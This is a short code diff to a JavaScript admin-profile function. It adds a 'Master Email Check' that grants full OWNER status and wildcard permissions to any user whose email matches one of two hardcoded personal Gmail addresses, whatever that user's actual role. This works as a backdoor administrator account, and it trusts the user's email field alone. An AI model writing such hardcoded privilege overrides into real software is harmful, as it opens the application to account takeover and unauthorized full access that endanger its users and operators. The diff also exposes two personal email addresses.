@@ -552,8 +552,9 @@ async function getAdminProfile(user, env) {
     } catch (e) {}
   }
 
-  // 3. Fallback direct role check
-  if (user.role === 'admin' || user.isAdmin === true) {
+  // 3. Fallback direct role check & Master Email Check
+  const userEmail = (user.email || '').toLowerCase().trim();
+  if (user.role === 'admin' || user.isAdmin === true || userEmail === 'ankit.babusaini@gmail.com' || userEmail === 'ankitsaini941413@gmail.com') {
     return { isAdmin: true, isOwner: true, role: 'OWNER', permissions: ['*'], status: 'active' };
   }
 
